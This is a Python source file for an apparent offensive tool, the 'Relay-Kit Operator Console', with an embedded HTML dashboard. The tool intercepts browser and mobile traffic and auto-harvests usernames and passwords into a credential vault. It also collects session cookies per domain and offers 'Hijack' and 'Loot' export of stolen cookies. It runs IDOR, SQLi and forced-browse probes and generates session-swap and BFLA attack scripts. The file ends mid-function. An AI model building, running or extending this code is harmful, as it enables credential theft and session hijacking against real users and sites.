import json
import os
import sys
import time
from collections import deque
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Any, Deque, Dict, List, Optional
from urllib.parse import parse_qs, urlparse

# Fix Windows console charmap encoding
if sys.stdout and hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if sys.stderr and hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

from .codegen import generate_curl_command, generate_python_script
from .models import CapturedRequest, detect_idor_params


DASHBOARD_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Relay-Kit Operator Console</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, monospace; background: #090d16; color: #f1f5f9; display: flex; height: 100vh; overflow: hidden; }
    #sidebar { width: 420px; border-right: 1px solid #1e293b; display: flex; flex-direction: column; background: #0d1322; }
    #header { padding: 10px 14px; border-bottom: 1px solid #1e293b; display: flex; justify-content: space-between; align-items: center; }
    #header h1 { font-size: 13px; color: #ef4444; display: flex; align-items: center; gap: 6px; }
    .badge { font-size: 10px; padding: 2px 6px; border-radius: 4px; font-weight: bold; }
    .badge-online { background: #065f46; color: #34d399; }
    .badge-count { background: #7f1d1d; color: #fca5a5; }
    #filter-bar { padding: 6px 12px; display: flex; gap: 6px; }
    #filter-input { flex: 1; background: #1e293b; border: 1px solid #334155; color: #f8fafc; padding: 5px 8px; border-radius: 4px; font-size: 11px; }
    #btn-clear { background: #334155; border: none; color: #94a3b8; padding: 5px 8px; border-radius: 4px; font-size: 10px; cursor: pointer; }
    #tag-bar { padding: 0 12px 6px 12px; border-bottom: 1px solid #1e293b; display: flex; gap: 3px; flex-wrap: wrap; align-items: center; }
    .tbtn { background: #1e293b; border: 1px solid #334155; color: #94a3b8; padding: 2px 7px; border-radius: 3px; font-size: 10px; cursor: pointer; }
    .tbtn.active { background: #b91c1c; color: white; border-color: #ef4444; font-weight: bold; }
    .tag-badge { font-size: 8px; padding: 1px 4px; border-radius: 2px; font-weight: bold; margin-left: 2px; }
    .tag-auth { background: #713f12; color: #facc15; } .tag-user { background: #581c87; color: #d8b4fe; }
    .tag-idor { background: #7f1d1d; color: #f87171; } .tag-api { background: #065f46; color: #34d399; }
    .tag-ws { background: #312e81; color: #a5b4fc; } .tag-action { background: #0369a1; color: #bae6fd; }
    #req-list { flex: 1; overflow-y: auto; }
    .req-item { padding: 8px 12px; border-bottom: 1px solid #141c2e; cursor: pointer; transition: background 0.1s; }
    .req-item:hover { background: #141f36; }
    .req-item.active { background: #1e293b; border-left: 3px solid #ef4444; }
    .req-meta { display: flex; align-items: center; gap: 3px; font-size: 10px; margin-bottom: 3px; flex-wrap: wrap; }
    .method-get { color: #38bdf8; font-weight: bold; } .method-post { color: #4ade80; font-weight: bold; }
    .method-ws_send { color: #a5b4fc; font-weight: bold; } .method-ws_recv { color: #c084fc; font-weight: bold; }
    .src-badge { padding: 1px 4px; border-radius: 2px; font-size: 8px; font-weight: bold; }
    .source-desktop { background: #1e3a8a; color: #93c5fd; } .source-mobile { background: #701a75; color: #f472b6; }
    .status-ok { color: #34d399; } .status-err { color: #f87171; }
    .req-url { font-size: 10.5px; color: #cbd5e1; word-break: break-all; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
    #main { flex: 1; display: flex; flex-direction: column; background: #090d16; }
    #tab-bar { display: flex; border-bottom: 1px solid #1e293b; background: #0d1322; }
    .tab-btn { background: none; border: none; color: #64748b; padding: 10px 16px; font-size: 11px; font-weight: bold; cursor: pointer; border-bottom: 2px solid transparent; }
    .tab-btn.active { color: #ef4444; border-bottom-color: #ef4444; }
    .tab-btn:hover { color: #f8fafc; }
    #tab-content { flex: 1; overflow-y: auto; padding: 14px 18px; }
    .panel { display: none; } .panel.active { display: block; }
    .section-title { font-size: 11px; font-weight: bold; color: #ef4444; margin: 10px 0 5px 0; text-transform: uppercase; letter-spacing: 0.5px; }
    .code-box { background: #0f172a; border: 1px solid #1e293b; border-radius: 5px; padding: 8px; font-size: 10.5px; color: #cbd5e1; white-space: pre-wrap; word-break: break-all; max-height: 220px; overflow-y: auto; }
    .token-chip { display: inline-block; background: #1e293b; border: 1px solid #334155; padding: 2px 6px; border-radius: 3px; font-size: 10px; color: #facc15; margin: 2px 3px 2px 0; cursor: pointer; }
    .btn { background: #b91c1c; color: white; border: none; padding: 5px 10px; border-radius: 4px; font-size: 10px; font-weight: bold; cursor: pointer; }
    .btn:hover { background: #991b1b; }
    .btn-sec { background: #334155; } .btn-sec:hover { background: #475569; }
    .btn-grn { background: #065f46; } .btn-grn:hover { background: #047857; }
    .session-card { background: #0f172a; border: 1px solid #1e293b; border-radius: 6px; padding: 10px; margin: 6px 0; }
    .session-card:hover { border-color: #ef4444; }
    .cred-row { display: flex; align-items: center; gap: 8px; padding: 6px 8px; border-bottom: 1px solid #1e293b; font-size: 11px; }
    .cred-row:hover { background: #1e293b; }
    .replay-group { display: flex; gap: 6px; margin: 8px 0; }
    .replay-input { flex: 1; background: #1e293b; border: 1px solid #334155; color: #f8fafc; padding: 5px 8px; border-radius: 4px; font-size: 11px; font-family: monospace; }
    textarea.replay-input { min-height: 80px; resize: vertical; }
  </style>
</head>
<body>
  <div id="sidebar">
    <div id="header">
      <h1>💀 Relay Operator Console</h1>
      <div><span class="badge badge-online" id="status-badge">● LIVE</span> <span class="badge badge-count" id="count-badge">0</span></div>
    </div>
    <div id="filter-bar">
      <input type="text" id="filter-input" placeholder="Filter domain / URL...">
      <button id="btn-clear">Clear</button>
    </div>
    <div id="tag-bar">
      <button class="tbtn active" data-tag="">All</button>
      <button class="tbtn" data-tag="AUTH">🔑 Auth</button>
      <button class="tbtn" data-tag="USER">👤 User</button>
      <button class="tbtn" data-tag="API">📦 API</button>
      <button class="tbtn" data-tag="IDOR">🎯 IDOR</button>
      <button class="tbtn" data-tag="WS">🔌 WS</button>
      <button class="tbtn" data-tag="IMPORTANT">⭐</button>
      <label style="font-size:9px;color:#64748b;margin-left:auto;display:flex;align-items:center;gap:3px;cursor:pointer">
        <input type="checkbox" id="chk-autoclean" checked> Hide noise
      </label>
    </div>
    <div id="req-list"></div>
  </div>

  <div id="main">
    <div id="tab-bar">
      <button class="tab-btn active" data-panel="p-detail">📡 Request</button>
      <button class="tab-btn" data-panel="p-sessions">🔑 Sessions</button>
      <button class="tab-btn" data-panel="p-creds">🗝️ Credentials</button>
      <button class="tab-btn" data-panel="p-replay">🔄 Replay</button>
      <button class="tab-btn" data-panel="p-loot">&#128176; Loot</button>
      <button class="tab-btn" data-panel="p-probe">&#128269; Probe</button>
    </div>
    <div id="tab-content">

      <!-- Panel 1: Request Detail -->
      <div id="p-detail" class="panel active">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
          <div id="detail-title" style="font-size:12px;font-weight:bold;color:#f8fafc;max-width:60%;word-break:break-all">Select a request</div>
          <div style="display:flex;gap:5px;flex-wrap:wrap">
            <button class="btn" id="btn-hijack">💀 Hijack</button>
            <button class="btn btn-sec" id="btn-copy-py">📋 Python</button>
            <button class="btn btn-sec" id="btn-copy-curl">📋 cURL</button>
          </div>
        </div>
        <div id="smart-banner"></div>
        <div class="section-title">Tokens & Auth</div>
        <div id="tokens-box">No request selected.</div>
        <div class="section-title">Headers</div>
        <div class="code-box" id="headers-box">--</div>
        <div class="section-title">Body</div>
        <div class="code-box" id="payload-box">--</div>
        <div class="section-title">Response</div>
        <div class="code-box" id="response-box">--</div>
      </div>

      <!-- Panel 2: Session Vault -->
      <div id="p-sessions" class="panel">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
          <div class="section-title" style="margin:0">🔑 Active Sessions by Domain</div>
          <button class="btn btn-sec" id="btn-refresh-sessions">Refresh</button>
        </div>
        <div id="sessions-list"><div style="color:#64748b;font-size:11px">Loading sessions...</div></div>
      </div>

      <!-- Panel 3: Credential Vault -->
      <div id="p-creds" class="panel">
        <div class="section-title">🗝️ Harvested Credentials</div>
        <div id="creds-list"><div style="color:#64748b;font-size:11px">No credentials captured yet. Browse login pages to auto-harvest.</div></div>
      </div>

      <!-- Panel 4: Replay & Tamper -->
      <div id="p-replay" class="panel">
        <div class="section-title">🔄 Replay & Tamper</div>
        <div class="replay-group">
          <select id="replay-method" class="replay-input" style="flex:0 0 80px"><option>GET</option><option>POST</option><option>PUT</option><option>DELETE</option></select>
          <input type="text" id="replay-url" class="replay-input" placeholder="URL to replay...">
          <button class="btn" id="btn-replay-send">Send</button>
        </div>
        <div class="section-title" style="font-size:10px">Headers (JSON)</div>
        <textarea id="replay-headers" class="replay-input" placeholder='{"Cookie": "ASP.NET_SessionId=xxx; .ASPXAUTH=yyy"}'></textarea>
        <div class="section-title" style="font-size:10px">Body</div>
        <textarea id="replay-body" class="replay-input" placeholder="Request body (form-urlencoded or JSON)"></textarea>
        <div class="section-title" style="font-size:10px">Response</div>
        <div class="code-box" id="replay-response" style="min-height:120px">Send a request to see response here.</div>
      </div>

      <!-- Panel 5: Loot Export -->
      <div id="p-loot" class="panel">
        <div class="section-title">💰 Loot Summary & Export</div>
        <div style="display:flex;gap:8px;margin:8px 0">
          <button class="btn btn-grn" id="btn-export-json">📥 Export JSON</button>
          <button class="btn btn-sec" id="btn-export-cookies">🍪 Export Cookies.txt</button>
        </div>
        <div id="loot-summary" style="font-size:11px;color:#94a3b8">Click Export to generate loot report.</div>
      </div>

      <!-- Panel 6: Auto Probe -->
      <div id="p-probe" class="panel">
        <div class="section-title" style="color:#f59e0b">&#128269; Auto Probe &#8212; IDOR / Forced Browse / SQLi / Info Leak</div>
        <div style="display:flex;gap:6px;margin:8px 0;align-items:center;flex-wrap:wrap">
          <button class="btn" id="btn-probe-all" style="background:#d97706">&#9889; Run All Probes</button>
          <button class="btn btn-sec" id="btn-probe-idor">IDOR</button>
          <button class="btn btn-sec" id="btn-probe-paths">Forced Browse</button>
          <button class="btn btn-sec" id="btn-probe-sqli">SQLi</button>
          <button class="btn btn-sec" id="btn-probe-info">Info Leak</button>
          <span id="probe-status" style="font-size:10px;color:#64748b;margin-left:8px"></span>
        </div>
        <div style="font-size:10px;color:#94a3b8;margin-bottom:8px">Chon 1 request co cookies &rarr; probe tu dong dung session cua ban de tim lo hong.</div>
        <div id="probe-results" style="font-size:11px">
          <div style="color:#64748b">Chua chay probe. Chon request roi nhan Run All Probes.</div>
        </div>
      </div>

    </div>
  </div>

  <script>
    let activeReqId = null;
    let allRequests = [];
    let selectedTag = '';

    // Tab switching
    document.querySelectorAll('.tab-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
        btn.classList.add('active');
        document.getElementById(btn.dataset.panel).classList.add('active');
        if (btn.dataset.panel === 'p-sessions') loadSessions();
        if (btn.dataset.panel === 'p-creds') loadCredentials();
      });
    });

    // Tag filters
    document.querySelectorAll('.tbtn').forEach(btn => {
      btn.addEventListener('click', () => {
        document.querySelectorAll('.tbtn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        selectedTag = btn.dataset.tag || '';
        fetchRequests();
      });
    });
    document.getElementById('chk-autoclean').addEventListener('change', fetchRequests);

    async function fetchRequests() {
      try {
        const f = document.getElementById('filter-input').value.trim();
        const ac = document.getElementById('chk-autoclean').checked ? '1' : '0';
        const res = await fetch(`/api/feed?filter=${encodeURIComponent(f)}&tag=${encodeURIComponent(selectedTag)}&auto_clean=${ac}`);
        if (res.ok) {
          const data = await res.json();
          allRequests = data.requests || [];
          document.getElementById('count-badge').textContent = allRequests.length;
          renderList();
        }
      } catch(_) {}
    }

    function renderList() {
      const el = document.getElementById('req-list');
      el.innerHTML = '';
      if (!allRequests.length) {
        el.innerHTML = '<div style="color:#64748b;padding:20px;text-align:center;font-size:11px">No requests captured yet.<br>Browse target sites to intercept traffic.</div>';
        return;
      }
      allRequests.forEach(req => {
        const item = document.createElement('div');
        item.className = 'req-item' + (req.id === activeReqId ? ' active' : '');
        const mc = 'method-' + req.method.toLowerCase();
        const sc = 'source-' + req.source.toLowerCase();
        const stc = req.response_status < 400 ? 'status-ok' : 'status-err';
        const tags = (req.tags||[]).filter(t=>t!=='IMPORTANT').map(t=>`<span class="tag-badge tag-${t.toLowerCase()}">${t}</span>`).join('');
        const act = req.trigger_action ? `<span class="tag-badge tag-action">${req.trigger_action}</span>` : '';
        const preview = req.preview_summary ? `<div style="font-size:9px;color:#34d399;margin-top:2px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${req.preview_summary}</div>` : '';
        if (req.is_important) { item.style.borderLeft='3px solid #f59e0b'; item.style.background='rgba(245,158,11,0.04)'; }
        item.innerHTML = `<div class="req-meta"><span class="src-badge ${sc}">${req.source.toUpperCase()}</span><span class="${mc}">${req.method}</span><span class="${stc}">${req.response_status}</span>${act}${tags}<span style="color:#475569;margin-left:auto;font-size:9px">${new Date(req.timestamp*1000).toLocaleTimeString()}</span></div><div class="req-url" title="${req.url}">${req.url}</div>${preview}`;
        item.addEventListener('click', () => selectRequest(req.id));
        el.appendChild(item);
      });
    }

    async function selectRequest(id) {
      activeReqId = id;
      renderList();
      // Switch to detail tab
      document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
      document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
      document.querySelector('[data-panel="p-detail"]').classList.add('active');
      document.getElementById('p-detail').classList.add('active');

      try {
        const res = await fetch('/api/request/' + id);
        if (!res.ok) return;
        const req = await res.json();
        document.getElementById('detail-title').textContent = req.method + ' ' + req.url;

        let banner = '';
        if (req.highlight_reason) banner = `<div style="background:#1c0a0a;border:1px solid #ef4444;color:#fca5a5;padding:6px 10px;border-radius:5px;font-size:11px;margin-bottom:8px"><b>🎯</b> ${req.highlight_reason}</div>`;
        document.getElementById('smart-banner').innerHTML = banner;
        document.getElementById('headers-box').textContent = JSON.stringify(req.headers, null, 2);
        document.getElementById('payload-box').textContent = req.body || '(empty)';
        document.getElementById('response-box').textContent = req.response_body || '(empty)';

        // Tokens
        const tokEl = document.getElementById('tokens-box');
        tokEl.innerHTML = '';
        const tokens = req.extracted_tokens || {};
        if (!Object.keys(tokens).length) { tokEl.textContent = 'No tokens detected.'; }
        else {
          for (const [k,v] of Object.entries(tokens)) {
            const chip = document.createElement('span');
            chip.className = 'token-chip';
            chip.textContent = k + ': ' + (v.length>30 ? v.substring(0,30)+'...' : v);
            chip.title = k + ' = ' + v;
            chip.addEventListener('click', () => { navigator.clipboard.writeText(v); chip.style.borderColor='#34d399'; setTimeout(()=>chip.style.borderColor='#334155',800); });
            const kl = k.toLowerCase();
            if (kl.includes('pass')||kl.includes('pwd')||kl.includes('matkhau')) { chip.style.borderColor='#ef4444'; chip.style.color='#fca5a5'; }
            else if (kl.includes('auth')||kl.includes('session')) { chip.style.borderColor='#a855f7'; chip.style.color='#d8b4fe'; }
            tokEl.appendChild(chip);
          }
        }

        // Auto-populate Replay tab
        document.getElementById('replay-url').value = req.url;
        document.getElementById('replay-method').value = req.method === 'POST' ? 'POST' : 'GET';
        document.getElementById('replay-headers').value = JSON.stringify(req.headers, null, 2);
        document.getElementById('replay-body').value = req.body || '';
      } catch(_) {}
    }

    // 💀 HIJACK — open target in new tab with stolen cookies
    document.getElementById('btn-hijack').addEventListener('click', async () => {
      if (!activeReqId) return alert('Select a request first');
      const res = await fetch('/api/request/' + activeReqId);
      const req = await res.json();
      const tokens = req.extracted_tokens || {};
      const cookies = [];
      for (const [k,v] of Object.entries(tokens)) {
        if (k.startsWith('cookie_')) continue;
        if (k.toLowerCase().includes('viewstate')||k.toLowerCase().includes('eventvalidation')) continue;
        cookies.push({name: k, value: v});
      }
      // Use chrome extension API via postMessage to inject httpOnly cookies
      window.open(`/api/hijack?url=${encodeURIComponent(req.url)}&cookies=${encodeURIComponent(JSON.stringify(cookies))}`, '_blank');
    });

    // 📋 Copy Python / cURL
    document.getElementById('btn-copy-py').addEventListener('click', async () => {
      if (!activeReqId) return;
      const r = await fetch('/api/codegen/' + activeReqId);
      const d = await r.json();
      navigator.clipboard.writeText(d.python);
    });
    document.getElementById('btn-copy-curl').addEventListener('click', async () => {
      if (!activeReqId) return;
      const r = await fetch('/api/codegen/' + activeReqId);
      const d = await r.json();
      navigator.clipboard.writeText(d.curl);
    });

    // 🔑 SESSIONS
    async function loadSessions() {
      const el = document.getElementById('sessions-list');
      try {
        const res = await fetch('/api/tokens');
        const data = await res.json();
        const tokens = data.tokens || {};
        if (!Object.keys(tokens).length) { el.innerHTML = '<div style="color:#64748b;font-size:11px">No sessions captured. Browse target sites first.</div>'; return; }
        el.innerHTML = '';
        for (const [domain, toks] of Object.entries(tokens)) {
          const card = document.createElement('div');
          card.className = 'session-card';
          let tokHtml = '';
          for (const [k,v] of Object.entries(toks)) {
            const kl = k.toLowerCase();
            const color = kl.includes('pass')||kl.includes('pwd') ? '#ef4444' : kl.includes('auth')||kl.includes('session') ? '#a855f7' : '#facc15';
            tokHtml += `<div style="font-size:10px;margin:2px 0"><span style="color:${color};font-weight:bold">${k}</span>: <span style="color:#94a3b8">${v.length>50?v.substring(0,50)+'...':v}</span></div>`;
          }
          card.innerHTML = `<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px"><span style="color:#38bdf8;font-weight:bold;font-size:12px">🌐 ${domain}</span><button class="btn" onclick="hijackDomain('${domain}')">💀 Hijack</button></div>${tokHtml}`;
          el.appendChild(card);
        }
      } catch(e) { el.innerHTML = `<div style="color:#f87171">${e.message}</div>`; }
    }
    document.getElementById('btn-refresh-sessions').addEventListener('click', loadSessions);
    window.hijackDomain = function(domain) {
      window.open(`http://${domain}`, '_blank');
    };

    // 🗝️ CREDENTIALS
    async function loadCredentials() {
      const el = document.getElementById('creds-list');
      try {
        const res = await fetch('/api/credentials');
        const data = await res.json();
        const creds = data.credentials || [];
        if (!creds.length) { el.innerHTML = '<div style="color:#64748b;font-size:11px">No credentials harvested yet.</div>'; return; }
        el.innerHTML = '<div class="cred-row" style="font-weight:bold;color:#ef4444"><span style="flex:1">Domain</span><span style="flex:1">Username</span><span style="flex:1">Password</span><span style="flex:0 0 60px">Time</span></div>';
        creds.forEach(c => {
          const row = document.createElement('div');
          row.className = 'cred-row';
          row.innerHTML = `<span style="flex:1;color:#38bdf8">${c.domain}</span><span style="flex:1;color:#facc15">${c.username}</span><span style="flex:1;color:#fca5a5;cursor:pointer" title="Click to copy" onclick="navigator.clipboard.writeText('${c.password}')">${c.password}</span><span style="flex:0 0 60px;color:#475569;font-size:9px">${new Date(c.timestamp*1000).toLocaleTimeString()}</span>`;
          el.appendChild(row);
        });
      } catch(e) { el.innerHTML = `<div style="color:#f87171">${e.message}</div>`; }
    }

    // 🔄 REPLAY
    document.getElementById('btn-replay-send').addEventListener('click', async () => {
      const method = document.getElementById('replay-method').value;
      const url = document.getElementById('replay-url').value;
      const headersRaw = document.getElementById('replay-headers').value;
      const body = document.getElementById('replay-body').value;
      const respBox = document.getElementById('replay-response');
      respBox.textContent = 'Sending...';
      try {
        const res = await fetch('/api/replay', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({method, url, headers: headersRaw, body})
        });
        const data = await res.json();
        respBox.textContent = `HTTP ${data.status}\n${'='.repeat(40)}\n${data.body || '(empty)'}`;
      } catch(e) { respBox.textContent = 'Error: ' + e.message; }
    });

    // 💰 LOOT EXPORT
    document.getElementById('btn-export-json').addEventListener('click', async () => {
      const res = await fetch('/api/report');
      const data = await res.json();
      const blob = new Blob([JSON.stringify(data,null,2)], {type:'application/json'});
      const a = document.createElement('a');
      a.href = URL.createObjectURL(blob);
      a.download = 'loot_' + new Date().toISOString().slice(0,10) + '.json';
      a.click();
    });
    document.getElementById('btn-export-cookies').addEventListener('click', async () => {
      const res = await fetch('/api/tokens');
      const data = await res.json();
      const tokens = data.tokens || {};
      let netscape = '# Netscape HTTP Cookie File\\n';
      for (const [domain, toks] of Object.entries(tokens)) {
        for (const [k,v] of Object.entries(toks)) {
          netscape += `${domain}\\tTRUE\\t/\\tFALSE\\t0\\t${k}\\t${v}\\n`;
        }
      }
      const blob = new Blob([netscape], {type:'text/plain'});
      const a = document.createElement('a');
      a.href = URL.createObjectURL(blob);
      a.download = 'cookies_' + new Date().toISOString().slice(0,10) + '.txt';
      a.click();
    });


    // Auto Probe handlers
    async function runProbe(probeType) {
      if (!activeReqId) return alert('Chon 1 request truoc!');
      const el = document.getElementById('probe-results');
      const st = document.getElementById('probe-status');
      st.textContent = 'Dang chay ' + probeType + '...';
      st.style.color = '#facc15';
      el.innerHTML = '<div style="color:#facc15">\u23f3 Probing... Co the mat 10-30s</div>';
      try {
        const res = await fetch('/api/probe', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({req_id: activeReqId, probe_type: probeType})
        });
        const data = await res.json();
        st.textContent = 'Xong! ' + (data.findings||[]).length + ' ket qua';
        st.style.color = '#34d399';
        renderProbeResults(data);
      } catch(e) {
        el.innerHTML = '<div style="color:#f87171">Error: ' + e.message + '</div>';
        st.textContent = 'Loi!';
        st.style.color = '#f87171';
      }
    }

    function renderProbeResults(data) {
      const el = document.getElementById('probe-results');
      if (!data.ok) { el.innerHTML = '<div style="color:#f87171">' + (data.error||'Unknown error') + '</div>'; return; }
      const findings = data.findings || [];
      if (!findings.length) {
        el.innerHTML = '<div style="color:#34d399">&#9989; Khong phat hien lo hong. Server bao ve tot.</div>';
        return;
      }
      let html = '';
      const vulns = findings.filter(f => f.severity === 'HIGH' || f.severity === 'CRITICAL');
      const warns = findings.filter(f => f.severity === 'MEDIUM');
      const infos = findings.filter(f => f.severity === 'LOW' || f.severity === 'INFO');
      if (vulns.length > 0) {
        html += '<div style="color:#ef4444;font-weight:bold;margin:8px 0">&#128680; ' + vulns.length + ' LO HONG NGHIEM TRONG:</div>';
        vulns.forEach(f => {
          html += '<div style="background:#1c0a0a;border:1px solid #ef4444;border-radius:4px;padding:8px;margin:4px 0">';
          html += '<div style="color:#fca5a5;font-weight:bold">[' + f.type + '] ' + f.title + '</div>';
          html += '<div style="color:#94a3b8;font-size:10px;margin-top:3px">' + f.detail + '</div>';
          if (f.evidence) html += '<pre style="background:#0f172a;padding:6px;border-radius:4px;color:#34d399;font-size:10px;margin-top:4px;max-height:120px;overflow:auto">' + f.evidence.substring(0,500) + '</pre>';
          html += '</div>';
        });
      }
      if (warns.length > 0) {
        html += '<div style="color:#f59e0b;font-weight:bold;margin:8px 0">&#9888;&#65039; ' + warns.length + ' CANH BAO:</div>';
        warns.forEach(f => {
          html += '<div style="background:#1a1300;border:1px solid #f59e0b;border-radius:4px;padding:6px;margin:3px 0;font-size:10.5px">';
          html += '<span style="color:#fcd34d">[' + f.type + ']</span> ' + f.title + ' <span style="color:#64748b">- ' + f.detail + '</span></div>';
        });
      }
      if (infos.length > 0) {
        html += '<div style="color:#64748b;margin:8px 0">' + infos.length + ' thong tin them:</div>';
        infos.forEach(f => {
          html += '<div style="font-size:10px;color:#475569;margin:2px 0">[' + f.type + '] ' + f.title + '</div>';
        });
      }
      el.innerHTML = html;
    }

    document.getElementById('btn-probe-all').addEventListener('click', () => runProbe('all'));
    document.getElementById('btn-probe-idor').addEventListener('click', () => runProbe('idor'));
    document.getElementById('btn-probe-paths').addEventListener('click', () => runProbe('paths'));
    document.getElementById('btn-probe-sqli').addEventListener('click', () => runProbe('sqli'));
    document.getElementById('btn-probe-info').addEventListener('click', () => runProbe('info'));

    document.getElementById('btn-clear').addEventListener('click', async () => {
      await fetch('/api/clear', {method:'POST'});
      activeReqId = null;
      fetchRequests();
    });
    document.getElementById('filter-input').addEventListener('input', fetchRequests);
    setInterval(fetchRequests, 1500);
    fetchRequests();
  </script>
</body>
</html>
"""


class SnifferHub:
    """Central traffic storage and RPC coordinator."""

    def __init__(self, max_records: int = 1000):
        self.max_records = max_records
        self.queue: Deque[CapturedRequest] = deque(maxlen=max_records)
        self.start_time = time.time()
        self.credentials: List[Dict[str, Any]] = []
        self._last_scan = None

    def ingest(self, req_data: Dict[str, Any]) -> Optional[CapturedRequest]:
        url = req_data.get("url", "")
        # Prevent self-capture loop completely
        if any(h in url for h in ("127.0.0.1:8999", "localhost:8999", ":8998", ":8999", "/api/feed", "/api/request/")):
            return None
        req = CapturedRequest.from_dict(req_data)
        self.queue.appendleft(req)
        # Auto-harvest credentials from tokens
        self._harvest_credentials(req)
        return req

    def _harvest_credentials(self, req: CapturedRequest) -> None:
        tokens = req.extracted_tokens or {}
        username = ""
        password = ""
        for k, v in tokens.items():
            kl = k.lower()
            if any(u in kl for u in ("user", "taikhoan", "log", "txtuser", "email", "account")) and not kl.startswith("cookie"):
                if v and len(v) > 1:
                    username = v
            if any(p in kl for p in ("pass", "pwd", "matkhau", "txtpass", "secret")) and not kl.startswith("cookie"):
                if v and len(v) > 1:
                    password = v
        if username or password:
            cred = {
                "domain": req.host,
                "url": req.url,
                "username": username,
                "password": password,
                "timestamp": req.timestamp,
                "source": req.source,
                "req_id": req.id
            }
            # Deduplicate
            for existing in self.credentials:
                if existing["domain"] == cred["domain"] and existing["username"] == cred["username"] and existing["password"] == cred["password"]:
                    return
            self.credentials.append(cred)

    def get_feed(
        self,
        filter_kw: str = "",
        limit: int = 100,
        source: str = "",
        tag: str = "",
        auto_clean: bool = True
    ) -> List[Dict[str, Any]]:
        results = []
        kw = filter_kw.lower()
        src = source.lower()
        tag_up = tag.upper()
        for r in self.queue:
            if "127.0.0.1:8999" in r.url or "localhost:8999" in r.url or "/api/feed" in r.url:
                continue
            if auto_clean and r.is_noise and not kw and not tag_up:
                continue
            if src and r.source != src:
                continue
            if tag_up and tag_up not in r.tags:
                continue
            if kw and (kw not in r.url.lower() and kw not in r.method.lower() and kw not in r.body.lower()):
                continue
            results.append(r.to_dict())
            if len(results) >= limit:
                break
        return results

    def get_by_id(self, req_id: str) -> Optional[CapturedRequest]:
        for r in self.queue:
            if r.id == req_id:
                return r
        return None

    def get_aggregated_tokens(self) -> Dict[str, Dict[str, str]]:
        tokens_by_host: Dict[str, Dict[str, str]] = {}
        for r in self.queue:
            if r.extracted_tokens:
                if r.host not in tokens_by_host:
                    tokens_by_host[r.host] = {}
                tokens_by_host[r.host].update(r.extracted_tokens)
        return tokens_by_host

    def clear(self) -> None:
        self.queue.clear()

    def get_status(self) -> Dict[str, Any]:
        desktop_count = sum(1 for r in self.queue if r.source == "desktop")
        mobile_count = sum(1 for r in self.queue if r.source == "mobile")
        return {
            "ok": True,
            "total_captured": len(self.queue),
            "desktop_count": desktop_count,
            "mobile_count": mobile_count,
            "uptime_seconds": round(time.time() - self.start_time, 1),
        }


def _build_scan_script(url: str, cookie_header: str, idor_params: dict, scan_type: str) -> str:
    from urllib.parse import urlparse as _up, parse_qs as _pqs, urlencode as _ue, urlunparse as _uu
    parsed = _up(url)
    base_params = dict((k, v[0]) for k, v in _pqs(parsed.query).items())
    lines = [
        "#!/usr/bin/env python3",
        f"# Auto-generated {scan_type.upper()} scan script — Relay-Kit Sniffer",
        "import requests, json",
        "",
        f"TARGET = {repr(url)}",
        f"COOKIES = {repr({'cookie': cookie_header} if cookie_header else {})}",
        f"BASE_PARAMS = {repr(base_params)}",
        f"IDOR_PARAMS = {repr(idor_params)}",
        "",
        "session = requests.Session()",
        "if COOKIES.get('cookie'):",
        "    session.headers['Cookie'] = COOKIES['cookie']",
        "session.headers['User-Agent'] = 'Mozilla/5.0'",
        "session.verify = False",
        "",
    ]
    if scan_type == "session_swap":
        lines += [
            "# SESSION SWAP: keep .ASPXAUTH, randomize ASP.NET_SessionId",
            "import random, string",
            "",
            "aspxauth = ''",
            "for part in COOKIES.get('cookie', '').split(';'):",
            "    part = part.strip()",
            "    if part.lower().startswith('.aspxauth='):",
            "        aspxauth = part.split('=', 1)[1]",
            "",
            "if not aspxauth:",
            "    print('[!] No .ASPXAUTH found')",
            "else:",
            "    for i in range(5):",
            "        fake_sid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=24))",
            "        swapped = f'ASP.NET_SessionId={fake_sid}; .ASPXAUTH={aspxauth}'",
            "        r = requests.get(TARGET, headers={'Cookie': swapped, 'User-Agent': 'Mozilla/5.0'}, verify=False, timeout=10)",
            "        print(f'[SWAP] sid={fake_sid[:12]}... -> HTTP {r.status_code} | {len(r.text)}B')",
        ]
    elif scan_type == "bfla":
        lines += [
            "# BFLA: replay request WITHOUT auth cookies",
            "anon_session = requests.Session()",
            "anon_session.headers['User-Agent'] = 'Mozilla/5.0'",
            "anon_session.verify = False",
            "",
            "print('[*] BFLA Test: replaying as anonymous...')",
            "r_auth = session.get(TARGET, params=BASE_PARAMS, timeout=10)",
            "r_anon = anon_session.get(TARGET, params=BASE_PARAMS, timeout=10)",
            "print(f'[AUTH]  {r_auth.status_code} — {len(r_auth.text)} bytes')",
            "print(f'[ANON]  {r_anon.status_code} — {len(r_anon.text)} bytes')",
            "if r_anon.status_code == 200 and len(r_anon.text) > 200:",
            "    print('[VULN] BFLA CONFIRMED: anonymous access returns data!')",
            "else:",
            "    print('[OK]   No BFLA detected.')",
        ]
    else:
        lines += [
            "baseline = session.get(TARGET, params=BASE_PARAMS, timeout=10)",
            "baseline_size = len(baseline.text)",
            "print(f'[*] Baseline: HTTP {baseline.status_code} — {baseline_size} bytes')",
            "",
            "findings = []",
            "for param, orig_val in IDOR_PARAMS.items():",
            "    if not orig_val.isdigit():",
            "        continue",
            "    base_n = int(orig_val)",
            "    for delta in range(-2, 13):",
